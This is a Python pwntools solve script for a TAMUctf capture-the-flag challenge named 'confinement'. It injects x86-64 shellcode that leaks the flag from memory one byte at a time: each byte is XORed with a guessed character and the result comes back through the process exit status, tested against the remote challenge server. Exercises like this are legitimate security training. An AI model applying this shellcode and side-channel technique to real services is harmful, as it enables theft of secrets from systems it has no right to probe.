#!/usr/bin/env python3
from pwn import *
import string

context.binary = elf = ELF('./confinement', checksec=False)
# context.log_level = "debug"

flag_offset = 0x24d50
exit_group = 0xE7

shellcode = f"""
    lea r12, [r12 + {flag_offset}]
    add r12, 0x7f # <-- will be replaced manually to avoid recompiling shellcode
    movzx edi, BYTE PTR [r12]
    xor edi, 0xFF # <-- will be replaced manually to avoid recompiling shellcode

    mov rax, {exit_group}
    syscall

    """.strip()

assembled = bytearray(asm(shellcode))

# optimized ordering for brute force
chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_{}"
for i in string.printable:
    if i not in chars and 0x20 <= ord(i) <= 0x7f:
        chars += i

flag = "gigem{"
while len(flag) == 0 or flag[-1] != "}":
    found = False
    for c in chars:
        p = remote("tamuctf.com", 443, ssl=True, sni="confinement")
        # p = process('./confinement_patched')

        assembled[11] = len(flag)
        assembled[19] = ord(c)

        p.sendline(bytes(assembled))
        result = p.recvline()
        p.close()

        if b"adios" in result:
            flag += c
            print("New flag:", flag)
            found = True
            break

    if not found:
        print("Failed to find valid char for flag ):")
        exit()